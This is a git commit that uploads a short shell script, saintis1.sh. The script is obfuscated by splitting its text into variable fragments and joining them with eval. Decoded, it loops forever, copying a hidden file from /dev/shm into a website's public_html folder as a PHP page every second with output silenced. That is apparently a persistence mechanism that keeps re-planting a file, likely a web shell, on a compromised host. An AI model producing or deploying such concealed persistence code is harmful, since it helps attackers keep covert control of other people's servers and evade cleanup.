30dd412727268d39a5656815157555504740877d
hime-yuki77 <123535502+hime-yuki77@users.noreply.github.com>
2023-02-10 18:27:17 +0700

    Add files via upload

---
+++ saintis1.sh
@@ -0,0 +1,3 @@
+z="
+";Gz='ows/';Sz='1; s';Mz='a/pu';Pz='l/dy';Wz=' &>/';Tz='leep';Lz='anak';Xz='null';Bz='e :;';Kz='/bah';Uz=' 1; ';Fz='shm/';Ez='dev/';Iz='ot /';Cz=' do ';Vz='done';Jz='home';Dz='cp /';Hz='reeb';Rz=' 0>&';Oz='_htm';Qz='.php';Nz='blic';Az='whil';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Ez$Xz"
